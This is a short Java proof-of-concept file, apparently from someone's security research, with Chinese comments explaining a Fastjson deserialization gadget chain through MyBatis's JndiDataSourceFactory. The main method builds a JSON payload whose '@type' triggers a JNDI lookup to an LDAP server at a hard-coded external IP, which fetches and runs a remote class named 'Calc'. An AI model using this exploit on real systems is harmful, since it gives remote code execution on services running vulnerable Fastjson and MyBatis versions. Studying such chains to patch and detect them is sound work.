import com.alibaba.fastjson.JSON;

/**
 * Created by xjj on 2023/3/8.
 */

/**
 * org.apache.ibatis.datasource.jndi.JndiDataSourceFactory#setProperties(java.util.Properties)
 *  javax.naming.InitialContext#lookup(java.lang.String)
 */
public class FastJson5_Eq1244 {
    // mybatis -> 3.x.x 系列<3.5.0 的版本
    public static void main(String[] args) {
        // org.apache.ibatis.datasource.jndi.JndiDataSourceFactory

        // setProperties()
        //  lookup( properties.getProperty(DATA_SOURCE) )

        // 1.先解析类和字段, 解析类, 分装好java.util.Properties
        // properties处 生成JndiDataSourceFactory的asm后走MapDeserializer -> 可以细看看里面很多key-value结构的数据都走这条
        // 2.调用properties的setter方法

//        org.apache.ibatis.datasource.jndi.JndiDataSourceFactory

        String ldap = "ldap://47.95.7.37:1389/Calc";
        String poc = String.format("{\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":{\"data_source\":\"%s\"}}", ldap);
        JSON.parseObject(poc);
    }
}
